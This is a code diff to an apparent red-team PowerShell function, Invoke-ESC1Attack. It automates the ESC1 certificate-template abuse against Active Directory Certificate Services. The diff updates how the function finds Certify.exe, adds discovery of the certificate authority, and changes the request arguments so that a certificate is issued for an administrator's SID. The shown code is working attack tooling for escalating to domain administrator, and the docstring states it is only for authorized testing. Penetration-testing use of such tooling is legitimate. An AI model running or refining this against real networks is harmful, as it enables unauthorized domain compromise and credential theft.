@@ -24,8 +24,8 @@ function Invoke-ESC1Attack {
         auto-discover available CAs. Format: "CA-SERVER\CA-NAME"
 
         .PARAMETER CertifyPath
-        Path to Certify.exe executable. If not specified, assumes Certify.exe is in the current
-        directory or PATH environment variable.
+        Path to Certify.exe executable. If not specified, assumes Certify.exe is in the Binaries
+        folder (.\Binaries\Certify.exe).
 
         .PARAMETER OutputPath
         Directory where certificate files (.pfx) will be saved. Defaults to current directory.
@@ -64,9 +64,11 @@ function Invoke-ESC1Attack {
         Only use in authorized penetration testing or red team exercises.
         
         Requires:
-        - Certify.exe (https://github.com/GhostPack/Certify)
+        - Certify.exe (https://github.com/GhostPack/Certify/releases) placed in .\Binaries\ folder
         - Network access to Certificate Authority
         - Appropriate permissions to enroll certificates
+        
+        Download Certify.exe and place it in the Binaries folder before using this function.
 
         .LINK
         https://posts.specterops.io/certified-pre-owned-d95910965cd2
@@ -81,7 +83,7 @@ function Invoke-ESC1Attack {
         [string]$CertificateAuthority,
         
         [Parameter()]
-        [string]$CertifyPath = ".\Certify.exe",
+        [string]$CertifyPath = ".\Binaries\Certify.exe",
         
         [Parameter()]
         [string]$OutputPath = ".",
@@ -95,9 +97,32 @@ function Invoke-ESC1Attack {
     begin {
         Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
         
-        # Validate Certify.exe exists
+        # Validate Certify.exe exists - check multiple possible locations
         if (-not (Test-Path -Path $CertifyPath)) {
-            throw "Certify.exe not found at path: $CertifyPath. Please ensure Certify.exe is available."
+            Write-Warning "Certify.exe not found at specified path: $CertifyPath"
+            
+            # Try common alternative locations
+            $alternativePaths = @(
+                ".\Binaries\Certify.exe",
+                ".\Tools\Certify.exe", 
+                ".\Certify.exe",
+                "C:\Tools\Certify.exe"
+            )
+            
+            $foundPath = $null
+            foreach ($altPath in $alternativePaths) {
+                if (Test-Path -Path $altPath) {
+                    $foundPath = $altPath
+                    break
+                }
+            }
+            
+            if ($foundPath) {
+                $CertifyPath = $foundPath
+                Write-Verbose "Found Certify.exe at alternative location: $CertifyPath"
+            } else {
+                throw "Certify.exe not found in any expected location. Please download Certify.exe from https://github.com/GhostPack/Certify/releases and place it in the Binaries folder."
+            }
         }
         
         # Validate output directory exists or create it
@@ -203,14 +228,42 @@ function Invoke-ESC1Attack {
         if (-not $CertificateAuthority) {
             try {
                 Write-Verbose "Auto-discovering Certificate Authority..."
-                $certifyDiscovery = & $CertifyPath find /quiet 2>&1
-                $caMatch = [regex]::Match($certifyDiscovery, "CA Name\s*:\s*(.+)")
-                if ($caMatch.Success) {
-                    $CertificateAuthority = $caMatch.Groups[1].Value.Trim()
-                    Write-Verbose "Discovered CA: $CertificateAuthority"
-                } else {
-                    throw "Could not auto-discover Certificate Authority"
+                
+                # First try using Get-CAFullName with ADCS objects
+                try {
+                    $adcsObjects = Get-AdcsObjects
+                    $caObjects = $adcsObjects | Where-Object { $_.SchemaClassName -eq 'pKIEnrollmentService' }
+                    if ($caObjects) {
+                        $caFullName = Get-CAFullName -CAObjects $caObjects
+                        if ($caFullName) {
+                            if ($caFullName -is [string]) {
+                                $CertificateAuthority = $caFullName
+                            } else {
+                                # Multiple CAs found, use the first one
+                                $CertificateAuthority = $caFullName[0]
+                                Write-Warning "Multiple CAs found, using first: $CertificateAuthority"
+                            }
+                            Write-Verbose "Discovered CA via ADCS objects: $CertificateAuthority"
+                        }
+                    }
+                } catch {
+                    Write-Verbose "Failed to discover CA via ADCS objects: $($_.Exception.Message)"
                 }
+                
+                # Fallback to Certify.exe enum-cas if ADCS method failed
+                if (-not $CertificateAuthority) {
+                    $certifyDiscovery = & $CertifyPath enum-cas /quiet 2>&1
+                    $caMatch = [regex]::Match($certifyDiscovery, "FullName\s*:\s*(.*?$)")
+                    if ($caMatch.Success) {
+                        $CertificateAuthority = $caMatch.Groups[1].Value.Trim()
+                        Write-Verbose "Discovered CA via Certify.exe: $CertificateAuthority"
+                    }
+                }
+                
+                if (-not $CertificateAuthority) {
+                    throw "Could not auto-discover Certificate Authority using either method"
+                }
+                
             } catch {
                 Write-Error "Failed to discover Certificate Authority: $($_.Exception.Message)"
                 return [PSCustomObject]@{
@@ -225,16 +278,20 @@ function Invoke-ESC1Attack {
         
         # Construct certificate file path
         $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
-        $certFileName = "ESC1-$templateName-$timestamp.pfx"
+        $certFileName = "ESC1-$templateName-$timestamp.out"
         $certFilePath = Join-Path -Path $OutputPath -ChildPath $certFileName
         
         # Build Certify.exe command arguments
         $certifyArgs = @(
             "request"
-            "/ca:$CertificateAuthority"
-            "/template:$templateName"
-            "/altname:$AdministratorSID"
-            "/outfile:$certFilePath"
+            "--ca"
+            $CertificateAuthority
+            "--template"
+            $templateName
+            "--sid"
+            $AdministratorSID
+            "--out-file"
+            $certFilePath
         )
         
         Write-Verbose "Certify command: $CertifyPath $($certifyArgs -join ' ')"
